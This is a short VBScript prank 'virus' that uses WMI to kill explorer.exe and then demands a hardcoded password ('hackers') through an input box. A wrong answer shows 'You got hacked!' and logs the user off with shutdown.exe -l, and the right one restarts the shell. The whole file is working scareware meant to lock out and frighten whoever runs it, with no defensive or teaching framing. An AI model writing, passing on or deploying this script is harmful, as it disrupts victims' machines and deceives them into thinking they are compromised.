password = "hackers"
strComputer = "."
strExe = "taskkill /F /IM explorer.exe"
' Connect to WMI
set objWMIService = getobject("winmgmts://"_
& strComputer & "/root/cimv2")




' Obtain the Win32_Process class of object.
Set objProcess = objWMIService.Get("Win32_Process")
Set objProgram = objProcess.Methods_( _
"Create").InParameters.SpawnInstance_
objProgram.CommandLine = strExe

'Execute the program now at the command line.
Set strShell = objWMIService.ExecMethod( _
"Win32_Process", "Create", objProgram)
Do
returnvalue = inputbox("Who are the most powerful people in the world?","Oh snap!")
Select case returnvalue
Case Password
MsgBox "Welcome oh smart one."

strComputer = "."
strExe = "explorer.exe"
' Connect to WMI
set objWMIService = getobject("winmgmts://"_
& strComputer & "/root/cimv2")

' Obtain the Win32_Process class of object.
Set objProcess = objWMIService.Get("Win32_Process")
Set objProgram = objProcess.Methods_( _
"Create").InParameters.SpawnInstance_
objProgram.CommandLine = strExe

'Execute the program now at the command line.
Set strShell = objWMIService.ExecMethod( _
"Win32_Process", "Create", objProgram)
Exit Do
Case Else
MsgBox "You got hacked!",0,"Virus"
strComputer = "."
strExe = "shutdown.exe -l"
' Connect to WMI
set objWMIService = getobject("winmgmts://"_
& strComputer & "/root/cimv2")
' Obtain the Win32_Process class of object.
Set objProcess = objWMIService.Get("Win32_Process")
Set objProgram = objProcess.Methods_( _
"Create").InParameters.SpawnInstance_
objProgram.CommandLine = strExe
'Execute the program now at the command line.
Set strShell = objWMIService.ExecMethod( _
"Win32_Process", "Create", objProgram)
WScript.echo "Created: " & strExe & " on " & strComputer
WSCript.Quit
End select
Loop